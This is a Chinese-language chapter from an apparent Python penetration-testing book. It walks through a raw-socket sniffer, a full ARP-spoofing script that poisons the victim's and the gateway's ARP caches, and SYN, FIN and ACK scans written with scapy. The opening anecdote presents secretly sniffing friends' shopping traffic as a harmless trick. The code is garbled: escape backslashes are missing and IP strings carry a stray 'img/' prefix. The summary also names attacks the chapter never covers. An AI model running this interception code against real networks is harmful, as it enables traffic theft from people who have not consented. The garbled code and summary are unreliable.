# 嗅探和渗透测试

当我攻读工程硕士（M.E）学位时，我经常使用我的最爱工具*Cain and Abel*在朋友的宿舍中嗅探网络。我的朋友们通常会上电子商务网站。第二天，当我告诉他们他们购物的鞋子很好时，他们会感到惊讶。他们总是想知道我是如何得到这些信息的。嗯，这都是因为嗅探网络。

在本章中，我们将学习嗅探网络，并涵盖以下主题：

+   嗅探的概念

+   网络嗅探的类型

+   使用 Python 进行网络嗅探

+   使用 Python 进行数据包制作

+   ARP 欺骗的概念和 Python 实现

+   通过自定义数据包制作来测试安全性

# 引入网络嗅探

嗅探是通过软件（应用程序）或硬件设备监视和捕获通过给定网络的所有数据包的过程。嗅探通常由网络管理员执行。但是，攻击者可能使用嗅探器来捕获数据，而这些数据有时可能包含敏感信息，例如用户名和密码。网络管理员使用交换机`SPAN`端口。交换机将流量的一个副本发送到`SPAN`端口。管理员使用此`SPAN`端口来分析流量。如果您是黑客，您一定使用过*Wireshark*工具。嗅探只能在子网内进行。在本章中，我们将学习使用 Python 进行嗅探。但是，在此之前，我们需要知道有两种嗅探方法。它们如下：

+   被动嗅探

+   主动嗅探

# 被动嗅探

被动嗅探是指从基于集线器的网络中嗅探。通过将数据包嗅探器放置在混杂模式下的网络中，黑客可以捕获子网内的数据包。

# 主动嗅探

这种类型的嗅探是在基于交换机的网络上进行的。交换机比集线器更智能。它在 MAC 表中检查后将数据包发送到计算机。主动嗅探是通过使用 ARP 欺骗来实现的，这将在本章中进一步解释。

# 使用 Python 实现网络嗅探

在学习网络嗅探的实现之前，让我们了解一个特定的`struct`方法：

+   `struct.pack(fmt, v1, v2, ...)`: 此方法返回一个包含根据给定格式打包的值`v1`、`v2`等的字符串

+   `struct.unpack(fmt, string)`: 此方法根据给定的格式解包字符串

让我们讨论以下代码片段中的代码：

```py
import struct
ms=  struct.pack('hhl', 1, 2, 3)
print (ms)
k= struct.unpack('hhl',ms)
print k
```

前述代码的输出如下：

```py
G:PythonNetworkingnetwork>python str1.py
 ☻ ♥
(1, 2, 3)
```

首先，导入`struct`模块，然后以`hhl`格式打包`1`、`2`和`3`整数。打包的值就像机器码一样。使用相同的`hhl`格式解包值；这里，`h`表示短整数，`l`表示长整数。更多细节将在后续章节中提供。

考虑客户端-服务器模型的情况；让我们通过一个例子来说明。

运行`struct1.py`文件。服务器端代码如下：

```py
import socket
import struct
host = "192.168.0.1"
port = 12347
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print "connected by", addr
msz= struct.pack('hhl', 1, 2, 3) 
conn.send(msz)
conn.close()
```

整个代码与我们之前看到的一样，使用`msz= struct.pack('hhl', 1, 2, 3)`打包消息和`conn.send(msz)`发送消息。

运行`unstruc.py`文件。客户端代码如下：

```py
import socket
import struct 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.0.1"
port =12347
s.connect((host,port))
msg= s.recv(1024)
print msg
print struct.unpack('hhl',msg)
s.close()
```

客户端代码接受消息并按给定格式解包。

客户端代码的输出如下：

```py
C:network>python unstruc.py
 ☻ ♥
(1, 2, 3)
```

服务器端代码的输出如下：

```py
G:PythonNetworkingprogram>python struct1.py
connected by ('192.168.0.11', 1417)
```

现在，您应该对如何打包和解包数据有一个相当好的理解。

# 格式字符

我们已经在打包和解包方法中看到了格式。在下表中，我们有**C 类型**和**Python 类型**列。它表示 C 和 Python 类型之间的转换。**标准大小**列指的是以字节为单位的打包值的大小：

| **格式** | **C 类型** | **Python 类型** | **标准大小** |
| --- | --- | --- | --- |
| x | 填充字节 | 无值 |  |
| c | 字符 | 长度为 1 的字符串 | 1 |
| b | 有符号字符 | 整数 | 1 |
| B | 无符号字符 | 整数 | 1 |
| ? | _Bool | bool | 1 |
| h | short | integer | 2 |
| H | unsigned short | integer | 2 |
| i | int | integer | 4 |
| I | unsigned int | integer | 4 |
| l | long | integer | 4 |
| L | unsigned long | integer | 4 |
| q | long long | integer | 8 |
| Q | unsigned long long | integer | 8 |
| f | float | float | 4 |
| d | double | float | 8 |
| s | char[] | string |  |
| p | char[] | string |  |
| P | void * | integer |  |

让我们来看看当一个值以不同格式打包时会发生什么：

```py
 >>> import struct
 >>> struct.pack('b',2)
  'x02'
  >>> struct.pack('B',2)
  'x02'
  >>> struct.pack('h',2)
  'x02x00'
```

我们用三种不同的格式打包了数字`2`。从前表中我们知道，*b*和*B*各自占用一个字节，这意味着它们的大小相同。然而，`*h*`占用两个字节。

现在，让我们使用长整型，即八个字节：

```py
  >>> struct.pack('q',2)
  'x02x00x00x00x00x00x00x00'
```

如果我们在网络上工作，应该在以下格式中使用`!`。`!`用于避免网络字节是小端还是大端的混淆。有关大端和小端的更多信息，您可以参考维基百科关于字节顺序的页面。

```py
  >>> struct.pack('!q',2)
  'x00x00x00x00x00x00x00x02'
  >>>
```

在格式中使用`!`时，您可以看到差异。

在进行嗅探之前，您应该了解以下定义：

+   **PF_PACKET**：它在设备驱动程序层运行。Linux 的`pcap`库使用`PF_PACKET`套接字。要运行此程序，您必须以 root 用户身份登录。如果您想在互联网协议层以下的最基本级别上发送和接收消息，那么您需要使用`PF_PACKET`。

+   **原始套接字**：它不关心网络层堆栈，并提供了一种快捷方式，可以直接与应用程序发送和接收数据包。

以下套接字方法用于字节顺序转换：

+   `socket.ntohl(x)`: 这是网络到主机的长整型。它将网络中的 32 位正整数转换为主机的字节顺序。

+   `socket.ntohs(x)`: 这是网络到主机的短整型。它将网络中的 16 位正整数转换为主机的字节顺序。

+   `socket.htonl(x)`: 这是主机到网络的长整型。它将主机中的 32 位正整数转换为网络的字节顺序。

+   `socket.htons(x)`: 这是主机到网络的短整型。它将主机中的 16 位正整数转换为网络的字节顺序。

那么，前面四种方法的意义是什么？

考虑一个 16 位数字，0000000000000011。当您将这个数字从一台计算机发送到另一台计算机时，它的顺序可能会改变。接收计算机可能会以另一种形式接收它，比如 1100000000000000。这些方法将从您的本机字节顺序转换为网络字节顺序，然后再转换回来。现在，让我们看一下实现网络嗅探器的代码，它将在 TCP/IP 的三层上工作，即物理层（以太网）、网络层（IP）和 TCP 层（端口）。

在查看代码之前，您应该了解所有三层的头部：

+   **物理层**：该层处理以太网帧，如下图所示：

![](img/8b41b288-afb2-42e6-9ee1-66278654c99c.png)

以太网帧 IEEE 802.3 的结构

上图的解释如下：

+   **前导码**由七个字节组成，全部为 10101010 的形式，接收器用它来建立位同步

+   **起始帧定界符**由一个字节组成，10101011，它是一个帧标志，表示帧的开始

+   目的地和源地址通常被引用为六个字节的以太网地址序列

我们只对源地址和目的地址感兴趣。数据部分包含 IP 和 TCP 头部。

您应该永远记住的一件事是，当帧到达我们的程序缓冲区时，它不包含**前导码**和**起始帧定界符**字段。

MAC 地址，如`AA:BB:CC:56:78:45`，包含 12 个十六进制字符，每个字节包含两个十六进制值。为了存储 MAC 地址，我们将使用六个字节的内存。

+   **网络或 IP 层**：在这一层，我们对源和目的地的 IP 地址感兴趣。

现在，让我们继续看下面的 IPv4 头部图表：

![](img/f167844a-aed1-4d01-836c-ed9d0f5f9fa5.png)

IPv4 头部

IPv4 数据包头由 14 个字段组成，其中只有 13 个是必需的。第 14 个字段是可选的。该头部长度为 20 字节。最后 8 个字节包含我们的源 IP 地址和目标 IP 地址。从第 12 到 16 个字节包含源 IP 地址，从第 17 到 20 个字节包含目标 IP 地址：

+   **TCP 头部**：在这个头部中，我们对源端口和目的端口地址感兴趣。如果注意 TCP 头部，您会意识到它也是 20 字节长，头部的起始两个字节提供了源端口，接下来的两个字节提供了目的端口地址。您可以在下图中看到 TCP 头部：

![](img/48d8e2b8-f201-4128-84c9-bb60fa6f0a6e.png)

TCP 头部

现在，启动接口卡的混杂模式，并以超级用户的身份给出命令。那么，什么是混杂模式？在计算机网络中，混杂模式允许网络接口卡读取到达其子网的数据包。例如，在集线器环境中，当数据包到达一个端口时，它会被复制到其他端口，只有预期的用户才能读取该数据包。但是，如果其他网络设备也在混杂模式下工作，那么该设备也可以读取该数据包：

```py
  ifconfig eth0 promisc
```

检查前面的命令的效果，如下截图所示，通过输入`ifconfig`命令：

![](img/80d8f576-8d9b-4761-8c40-cb4d6486e756.png)

显示混杂模式

前面的截图显示了`eth0`网络卡，并且它正在混杂模式下工作。

由于其驱动程序、内核支持等原因，有些网卡无法设置为混杂模式。

现在，是时候编码了。首先，让我们完整地看一下以下代码片段，然后逐行理解它：

```py
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
while True:
  try:
    pkt = s.recvfrom(2048)
    ethhead = pkt[0][0:14]
    eth = struct.unpack("!6s6s2s",ethhead)
    print "*"*50
    print "--------Ethernet Frame--------"
    print "Source MAC --> Destination MAC"
    print binascii.hexlify(eth[1]),"-->",binascii.hexlify(eth[0])
    print "-----------IP------------------"
    num=pkt[0][14].encode('hex')
    ip_length = (int(num)%10)*4
    ip_last_range = 14+ip_length
    ipheader = pkt[0][14:ip_last_range]
    ip_hdr = struct.unpack("!12s4s4s",ipheader)
    print "Source IP--> Destination IP"
    print socket.inet_ntoa(ip_hdr[1]),"-->", socket.inet_ntoa(ip_hdr[2])
    print "---------TCP----------"
    tcpheader = pkt[0][ip_last_range:ip_last_range+20]

    tcp_hdr = struct.unpack("!HH9sB6s",tcpheader)
    print "Source Port--> Destination Port"
    print tcp_hdr[0],"-->", tcp_hdr[1]
    flag1 =tcp_hdr[3]
    str1 = bin(flag1)[2:].zfill(8) 
    flag1 = ''
    if str1[0]== '1':
      flag1 = flag1+"CWR "
    if str1[1] == '1':
      flag1 = flag1+ "ECN Echo "
    if str1[2] == '1':
      flag1 = flag1 + "Urgent "
    if str1[3]== '1':
      flag1 = flag1+ "Ack "

    if str1[4]== '1':
      flag1 = flag1+"Push "
    if str1[5] == '1':
      flag1 = flag1+ "Reset "
    if str1[6] == '1':
      flag1 = flag1 + "Sync "
    if str1[7]== '1':
      flag1 = flag1+ "Fin "

    print "Flag", flag1
  except Exception as e :
    print e

```

我们已经定义了`socket.PF_PACKET, socket.SOCK_RAW`行。`socket.htons(0x0800)`语法显示了感兴趣的协议。`0x0800`代码定义了`ETH_P_IP`协议。您可以在`/usr/include/linux`中的`if_ether.h`文件中找到所有代码。`pkt = s.recvfrom(2048)`语句创建了一个 2048 的缓冲区。传入的帧存储在`pkt`变量中。如果打印这个`pkt`，它会显示元组，但我们宝贵的信息位于第一个元组中。`ethhead = pkt[0][0:14]`语句从`pkt`中取出前 14 个字节。以太网帧长度为 14 字节，它首先出现在下图中，这就是为什么我们使用前 14 个字节：

![](img/d6a4895e-4ca3-4853-80b2-058b75a93041.png)

头部的配置

在`eth = struct.unpack("!6s6s2s",ethhead)`语句中，`!`表示网络字节，`6s`表示六个字节，正如我们之前讨论的那样。`binascii.hexlify(eth[0])`语句返回了二进制数据的十六进制表示。`ip_length = (int(num)%10)*4`语法告诉我们 IPv4 头部的大小。`ipheader = pkt[0][14:ip_last_range]`语句提取了范围内的数据。接下来是 IP 头部和`ip_hdr =struct.unpack("!12s4s4s",ipheader)`语句，它将数据解包成三部分，其中我们的目标和源 IP 地址分别位于第二部分和第三部分。`socket.inet_ntoa(ip_hdr[3])`语句将 32 位打包的 IPv4 地址（一个长度为四个字符的字符串）转换为其标准的点分十进制字符串表示形式。

`tcpheader **=** pkt[0][ip_last_range:ip_last_range+20]`语句提取了接下来的 20 个字节数据。`tcp_hdr = struct.unpack("!HH9sB6s",tcpheader)`语句分为五部分，即`HH9sB6s`首先，然后是源端口和目的端口号。第四部分 B 表示标志值。使用`str1 = bin(flags)[2:].zfill(8)`语法将标志 int 值转换为八位二进制值。

`sniffer_new.py`的输出如下：

```py
 --------Ethernet Frame--------
Source MAC --> Destination MAC
005056e2859d --> 000c29436fc7
-----------IP------------------
Source IP--> Destination IP
91.198.174.192 --> 192.168.0.24
---------TCP----------
Source Port--> Destination Port
443 --> 43885
Flag Ack Push Fin 

**************************************************
--------Ethernet Frame--------
Source MAC --> Destination MAC
005056e2859d --> 000c29436fc7
-----------IP------------------
Source IP--> Destination IP
91.198.174.192 --> 192.168.0.24
---------TCP----------
Source Port--> Destination Port
443 --> 43851
Flag Ack 
```

我们的 sniffer 现在运行正常。让我们讨论输出的结果。以太网帧显示了目的 MAC 和源 MAC。IP 头告诉源 IP 数据包来自何处，目的 IP 是运行在我们子网上的另一个操作系统。TCP 头显示了`源端口`，`目的端口`和`标志`。源端口是`443`，这表明有人正在浏览网站。既然我们有了 IP 地址，让我们看看`91.198.174.192`上运行着哪个网站：

```py
 >>> import socket
 >>> socket.gethostbyaddr('91.198.174.192')
('text-lb.esams.wikimedia.org', [], ['91.198.174.192'])
>>>
```

前面的结果显示了`text-lb.esams.wikimedia.org`[ ](http://text-lb.esams.wikimedia.org)网站。

在输出中，显示了两个数据包。如果打印`tcp_hdr[3]`：

![](img/b42e4674-f2e5-425f-99d0-5dc9d080f4cf.png)

标志值

如果出现`16`，那么`bin(flag1)[2:].zfill(8)`语法将返回`00010000`，这意味着 ACK 位已打开。整数 25 表示 00011001，这表示**Ack**，**Push**和**Fin**位已打开。

现在，让我们对代码进行一些修改。在代码的末尾添加一行：

```py
print pkt[0][ip_last_range+20:]
```

让我们看看输出如何改变：

```py
  HTTP/1.1 304 Not Modified
  Server: Apache
  X-Content-Type-Options: nosniff
  Cache-control: public, max-age=300, s-maxage=300
  Last-Modified: Thu, 25 Sep 2014 18:08:15 GMT
  Expires: Sat, 27 Sep 2014 06:41:45 GMT
  Content-Encoding: gzip
  Content-Type: text/javascript; charset=utf-8
  Vary: Accept-Encoding,X-Use-HHVM
  Accept-Ranges: bytes
  Date: Sat, 27 Sep 2014 06:37:02 GMT
  X-Varnish: 3552654421 3552629562
  Age: 17
  Via: 1.1 varnish
  Connection: keep-alive
  X-Cache: cp1057 hit (138)
  X-Analytics: php=zend
```

有时，我们对 TTL 感兴趣，这是 IP 头的一部分。这意味着我们将不得不更改解包函数：

```py
    ipheader = pkt[0][14:ip_last_range]
    ip_hdr = struct.unpack("!8sB3s4s4s",ipheader)
    print "Source IP--> Destination IP, "
    print socket.inet_ntoa(ip_hdr[3]),"-->", socket.inet_ntoa(ip_hdr[4])
    print "TTL: ",ip_hdr[1]
```

现在，让我们检查`sniffer_ttl.py`的输出：

```py
 --------Ethernet Frame--------
Source MAC --> Destination MAC
005056e2859d --> 000c29436fc7
-----------IP------------------
Source IP--> Destination IP
74.125.24.157 --> 192.168.0.24
TTL: 128
---------TCP----------
Source Port--> Destination Port
443 --> 48513
16
Flag Ack 
```

`TTL`值为`128`。那它是如何工作的呢？非常简单；我们以 8sB3s4s4s 的格式解包了值，我们的 TTL 字段出现在第九个字节。8s 之后意味着在第八个字节之后，我们以 B 的形式得到 TTL 字段。

# 了解数据包构造

这是黑客或渗透测试人员可以创建定制数据包的技术。通过使用定制数据包，黑客可以执行许多任务，如探测防火墙规则集、端口扫描和操作系统的行为。有许多工具可用于数据包构造，如 Hping 和 Colasoft 数据包生成器。数据包构造是一种技能。您可以在没有工具的情况下执行它，因为您有 Python。

首先，我们创建以太网数据包，然后将它们发送给受害者。让我们看看`eth.py`的整个代码，然后逐行理解它：

```py
import socket
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))
sor = 'x00x0cx29x4fx8ex35'
des ='x00x0Cx29x2Ex84x7A'
code ='x08x00'
eth = des+sor+code
s.send(eth)
```

您已经在数据包嗅探器中看到了`s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))`。现在，决定网络接口。我们选择 eth0 接口发送数据包。`s.bind(("eth0",socket.htons(0x0800)))`语句将 eth0 接口与协议值绑定。接下来的两行定义了源 MAC 地址和目的 MAC 地址。`code ='x08x00'`语句显示了感兴趣的协议。这是 IP 协议的代码。`eth = des+sor+code`语句用于组装数据包。下一行`s.send(eth)`发送数据包。

# 介绍 ARP 欺骗并使用 Python 实现

**ARP**（**地址解析协议**）用于将 IP 地址转换为其对应的以太网（MAC）地址。当数据包到达网络层（OSI）时，它具有目的设备的 IP 地址和数据链路层数据包，需要目的设备的 MAC 地址。在这种情况下，发送方使用 ARP。

术语**地址解析**指的是在网络中查找计算机的 MAC 地址的过程。以下是 ARP 可能发送的两种类型的 ARP 消息：

+   ARP 请求

+   ARP 回复

# ARP 请求

主机可能想要向同一子网中的另一台机器发送消息。主机只知道 IP 地址，而在数据链路层发送消息需要 MAC 地址。在这种情况下，主机广播 ARP 请求。子网中的所有机器都会收到消息。值的以太网协议类型是`0x806`。

# ARP 回复

预期的用户将以他们的 MAC 地址做出回应。这个回复是单播的，称为 ARP 回复。

# ARP 缓存

为了减少地址解析请求的数量，客户端通常会缓存解析的地址一段时间。ARP 缓存是有限大小的。当任何设备想要向子网中的另一个目标设备发送数据时，它必须首先确定该目标的 MAC 地址，即使发送方知道接收方的 IP 地址。这些 IP 到 MAC 地址映射来自每个设备上维护的 ARP 缓存。未使用的条目将被删除，这样可以释放缓存中的一些空间。使用`arp -a`命令查看 ARP 缓存，如下屏幕截图所示：

！[](img/79a028ae-7eff-40e2-a4e1-9323e982c44b.png)

ARP 缓存

ARP 欺骗，也称为 ARP 缓存中毒，是一种攻击类型，攻击者通过改变受害者机器的 MAC 地址，在网关的 ARP 缓存中，以及改变网关的 MAC 地址，在受害者机器的 ARP 缓存中。这种技术用于攻击局域网。攻击者可以在局域网上嗅探数据帧。在 ARP 欺骗中，攻击者向网关和受害者发送虚假回复。目的是将攻击者的 MAC 地址与另一个主机的 IP 地址（如默认网关）关联起来。ARP 欺骗用于主动嗅探。

现在，我们将使用一个示例来演示 ARP 欺骗。

网络中所有机器的 IP 地址和 MAC 地址如下：

| **机器名称** | **IP 地址** | **MAC 地址** |
| --- | --- | --- |
| Windows XP（受害者） | `192.168.0.11` | `00:0C:29:2E:84:7A` |
| Linux（攻击者） | `192.168.0.10` | `00:0C:29:4F:8E:35` |
| Windows 7（网关） | `192.168.0.1` | `00:50:56:C0:00:08` |

让我们来看一下下面的图中显示的 ARP 协议头部：

！[](img/3021d565-f923-4660-880d-3016357b854d.png)

ARP 头部

让我们逐行查看代码来实现 ARP 欺骗并讨论它：

```py
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

sor = 'x00x0cx29x4fx8ex35'
victmac ='x00x0Cx29x2Ex84x7A'

gatemac = 'x00x50x56xC0x00x08'
code ='x08x06'
eth1 = victmac+sor+code #for victim
eth2 = gatemac+sor+code # for gateway

htype = 'x00x01'
protype = 'x08x00'
hsize = 'x06'
psize = 'x04'
opcode = 'x00x02'

gate_ip = '192.168.0.1'
victim_ip = '192.168.0.11' 
gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

while 1:
  s.send(arp_victim)
  s.send(arp_gateway)
```

在之前的数据包制作部分，您创建了以太网帧。在这段代码中，我们使用了三个 MAC 地址，这些地址也显示在前面的表中。在这里，我们使用了`code ='x08x06'`，这是 ARP 协议的代码。制作的两个以太网数据包是`eth1`和`eth2`。下一行，`htype ='x00x01'`，表示以太网。一切都按照 ARP 头部中显示的顺序进行，`protype ='x08x00'`表示协议类型；`hsize ='x06'`显示硬件地址大小；`psize ='x04'`给出 IP 地址长度；`opcode ='x00x02'`显示这是一个回复数据包。`gate_ip ='192.168.0.1'`和`victim_ip ='192.168.0.11'`语句分别是网关和受害者的 IP 地址。`socket.inet_aton（gate_ip）`方法将 IP 地址转换为十六进制格式。最后，我们根据 ARP 头部组装整个代码。`s.send()`方法也将数据包放在了电缆上。

现在，是时候看输出了。运行`arpsp.py`文件。

让我们检查一下受害者的 ARP 缓存：

！[](img/c97cc4e2-236b-4234-8e37-6c55fef80370.png)

受害者的 ARP 缓存

前面的屏幕截图显示了 ARP 欺骗攻击之前和之后的 ARP 缓存。从屏幕截图中可以清楚地看出网关 IP 的 MAC 地址已经改变。我们的代码运行正常。

让我们检查一下网关的 ARP 缓存：

！[](img/a3f826fc-2fee-43ee-8667-548dd7de270e.png)

网关的 ARP 缓存

前面的屏幕截图显示我们的代码已经成功运行。受害者和攻击者的 IP 具有相同的 MAC 地址。现在，所有发送到网关的数据包都将通过攻击者的系统，并且攻击者可以有效地读取网关和受害者计算机之间来回传输的数据包。

在渗透测试中，你必须攻击（ARP 欺骗）网关，以调查它是否容易受到 ARP 欺骗的影响。

# 使用自定义数据包构造测试安全系统

在本节中，我们将看到一些特殊类型的扫描。在第二章中，*扫描渗透*，你看到了基于 TCP 连接扫描的端口扫描器。三次握手是 TCP 连接扫描的基本概念。

# 半开放扫描

半开放扫描或隐形扫描，顾名思义，是一种特殊类型的扫描。隐形扫描技术用于绕过防火墙规则，并避免被日志系统检测到。然而，这是一种特殊类型的扫描，通过数据包构造来实现，这在本章前面已经解释过。如果你想制作 IP 或 TCP 数据包，那么你必须提到每个部分。我知道这很痛苦，你可能会想到*Hping*。然而，Python 的库会让它变得简单。

现在，让我们来看一下如何使用 scapy。Scapy 是一个第三方库，允许你制作定制的数据包。我们将编写一个简单而简短的代码，以便你能够理解 scapy。

在编写代码之前，让我们了解一下半开放扫描的概念。以下步骤定义了隐形扫描：

1.  客户端向目标端口发送一个 SYN 数据包

1.  如果端口是打开的，服务器会用`SYN`/`ACK`数据包进行响应

1.  如果服务器用`RST`数据包进行响应，这意味着端口是关闭的

1.  客户端发送`RST`来关闭初始化

现在，让我们来看一下代码，接下来也会进行解释：

```py
from scapy.all import *
ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.3" )
tcp1 = TCP(sport =1024, dport=80, flags="S", seq=12345)
packet = ip1/tcp1
p =sr1(packet, inter=1)
p.show()

rs1 = TCP(sport =1024, dport=80, flags="R", seq=12347)
packet1=ip1/rs1
p1 = sr1(packet1)
p1.show
```

第一行导入了 scapy 的所有模块。下一行，`ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.3" )`，定义了 IP 数据包。IP 数据包的名称是`ip1`，其中包含了源地址和目的地址。`tcp1 = TCP(sport =1024, dport=80, flags="S", seq=12345)`语句定义了名为`tcp1`的`TCP`数据包，该数据包包含了源端口和目的端口。我们对端口`80`感兴趣，因为我们已经定义了隐形扫描的前几步。在第一步中，客户端向服务器发送一个`SYN`数据包。在我们的`tcp1`数据包中，`SYN`标志已经设置如数据包所示，并且 seq 是随机给定的。

下一行，`packet= ip1/tcp1`，首先安排 IP，然后是`TCP`。`p =sr1(packet, inter=1)`语句接收数据包。`sr1()`函数使用发送和接收的数据包，但它只接收一个应答数据包，`inter= 1`，这表示一个间隔为一秒，因为我们希望两个数据包之间有一秒的间隔。下一行，`p.show()`，给出了接收数据包的分层视图。`rs1 = TCP(sport =1024, dport=80, flags="R", seq=12347)`语句将发送带有`RST`标志的数据包。接下来的几行很容易理解。在这里，不需要`p1.show`，因为我们不接受服务器的任何响应。

输出如下：

```py
  root@Mohit|Raj:/scapy# python halfopen.py
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  .*Finished to send 1 packets.
  Received 2 packets, got 1 answers, remaining 0 packets
  ###[ IP ]###
    version   = 4L
    ihl       = 5L
    tos       = 0x0
    len       = 44
    id        = 0
    flags     = DF
    frag      = 0L
    ttl       = 64
    proto     = tcp
    chksum    = 0xb96e
    src       = 192.168.0.3
    dst       = 192.168.0.10
  options 
  ###[ TCP ]###
       sport     = http
       dport     = 1024
       seq       = 2065061929
       ack       = 12346
       dataofs   = 6L
       reserved  = 0L
       flags     = SA
       window    = 5840
       chksum    = 0xf81e
       urgptr    = 0
       options   = [('MSS', 1460)]
  ###[ Padding ]###
          load      = 'x00x00'
  Begin emission:
  Finished to send 1 packets.
  ..^Z
  [10]+  Stopped python halfopen.py
```

所以我们收到了我们的应答数据包。源和目的地看起来都很好。看一下`TCP`字段，注意标志的值。我们有 SA，表示`SYN`和`ACK`标志。正如我们之前讨论的，如果服务器响应带有`SYN`和`ACK`标志，这意味着端口是打开的。*Wireshark*也捕获了响应，如下面的屏幕截图所示：

![](img/e98f4962-63b4-4a9f-8079-19212937f167.png)

Wireshark 输出

现在，让我们再做一次，但是这次目的地将不同。从输出中，你将知道目的地地址是什么：

```py
  root@Mohit|Raj:/scapy# python halfopen.py 
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  .*Finished to send 1 packets.
  Received 2 packets, got 1 answers, remaining 0 packets
  ###[ IP ]###
    version   = 4L
    ihl       = 5L
    tos       = 0x0
    len       = 40
    id        = 37929
  flags     = 
    frag      = 0L
    ttl       = 128
    proto     = tcp
    chksum    = 0x2541
    src       = 192.168.0.11
    dst       = 192.168.0.10
  options 
  ###[ TCP ]###
       sport     = http
       dport     = 1024
       seq       = 0
       ack       = 12346
       dataofs   = 5L
       reserved  = 0L
       flags     = RA
       window    = 0
       chksum    = 0xf9e0
       urgptr    = 0
       options   = {}
  ###[ Padding ]###
          load      = 'x00x00x00x00x00x00'
  Begin emission:
  Finished to send 1 packets.
  ^Z
  [12]+  Stopped                 python halfopen.py
  root@Mohit|Raj:/scapy#
```

这一次，它返回了`RA`标志，意味着`RST`和`ACK`。这意味着端口是关闭的。

# FIN 扫描

有时防火墙和**入侵检测系统**（**IDS**）被配置为检测`SYN`扫描。在 FIN 扫描攻击中，向远程主机发送一个只有 FIN 标志的`TCP`数据包。如果主机没有响应，这意味着端口是开放的。如果收到响应，其中包含`RST`/`ACK`标志，这意味着端口是关闭的。

以下是 FIN 扫描的代码：

```py
from scapy.all import *
ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.11")
sy1 = TCP(sport =1024, dport=80, flags="F", seq=12345)
packet = ip1/sy1
p =sr1(packet)
p.show()
```

数据包与之前的相同，只有 FIN 标志设置。现在，检查来自不同机器的响应：

```py
root@Mohit|Raj:/scapy# python fin.py 
WARNING: No route found for IPv6 destination :: (no default route?)
Begin emission:
.Finished to send 1 packets.
*
Received 2 packets, got 1 answers, remaining 0 packets
###[ IP ]###
  version   = 4L
  ihl       = 5L
  tos       = 0x0
  len       = 40
  id        = 38005
  flags     = 
  frag      = 0L
  ttl       = 128
  proto     = tcp
  chksum    = 0x24f5
  src       = 192.168.0.11
  dst       = 192.168.0.10
  options   
###[ TCP ]###
     sport     = http
     dport     = 1024
     seq       = 0
     ack       = 12346
     dataofs   = 5L
     reserved  = 0L
     flags     = RA
     window    = 0
     chksum    = 0xf9e0
     urgptr    = 0
     options   = {}
###[ Padding ]###
        load      = 'x00x00x00x00x00x00'
```

传入的数据包包含`RST`/`ACK`标志，这意味着端口是关闭的。现在，我们将目的地更改为`192.168.0.3`并检查响应：

```py
root@Mohit|Raj:/scapy# python fin.py 
WARNING: No route found for IPv6 destination :: (no default route?)
Begin emission:
.Finished to send 1 packets.
....^Z
[13]+  Stopped                 python fin.py
```

从目的地没有收到响应，这意味着端口是开放的。

# ACK 标志扫描

`ACK`扫描方法用于确定主机是否受到某种过滤系统的保护。

在这种扫描方法中，攻击者发送带有随机序列号的`ACK`探测数据包，没有响应意味着端口被过滤（在这种情况下存在有状态检查防火墙）；如果收到 RST 响应，这意味着端口是关闭的。

现在，让我们浏览一下这段代码：

```py
from scapy.all import *
ip1 = IP(src="img/192.168.0.10", dst ="192.168.0.11")
sy1 = TCP(sport =1024, dport=137, flags="A", seq=12345)
packet = ip1/sy1
p =sr1(packet)
p.show()
```

在上述代码中，标志已设置为`ACK`，目的地端口为`137`。

现在，检查输出：

```py
  root@Mohit|Raj:/scapy# python ack.py 
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  ..Finished to send 1 packets.
  ^Z
  [30]+  Stopped                 python ack.py
```

数据包已发送，但没有收到响应。您不需要担心，因为我们有我们的 Python 嗅探器来检测响应。因此运行嗅探器，无需以混杂模式运行它，并重新发送`ACK`数据包：

```py
  Out-put of sniffer 
   --------Ethernet Frame--------
  desination mac 000c294f8e35
  Source mac 000c292e847a
  -----------IP------------------
  TTL : 128
  Source IP 192.168.0.11
  Destination IP 192.168.0.10
  ---------TCP----------
  Source Port  137
  Destination port  1024
  Flag  04
```

返回的数据包显示`Flag 04`，意味着`RST`。这意味着端口没有被过滤。

让我们设置防火墙，再次检查`ACK`数据包的响应。现在防火墙已设置好，让我们再次发送数据包。输出将如下所示：

```py
  root@Mohit|Raj:/scapy# python ack.py 
  WARNING: No route found for IPv6 destination :: (no default route?)
  Begin emission:
  .Finished to send 1 packets.
```

嗅探器的输出显示没有任何内容，这意味着防火墙存在。

# 总结

在本章的开头，我们学习了嗅探器的概念，以及在网络上使用嗅探器，有时可能会揭示密码和聊天等重要信息。在今天的世界中，大多数情况下使用交换机，因此您应该知道如何执行主动嗅探。我们还学习了如何制作一个第 4 层嗅探器。然后我们学习了如何执行 ARP 欺骗。您应该通过 ARP 欺骗测试网络，并将您的发现写入报告。然后，我们研究了使用自定义数据包测试网络的主题。网络脱离攻击类似于 ARP 缓存中毒攻击，这也有所解释。半开放、FIN 扫描和`ACK`标志扫描是我们也涉及到的特殊类型的扫描。最后，解释了与 DDOS 攻击相关的死亡之针。

在第四章中，*网络攻击和防范*，我们将学习网络攻击和防范网络攻击。
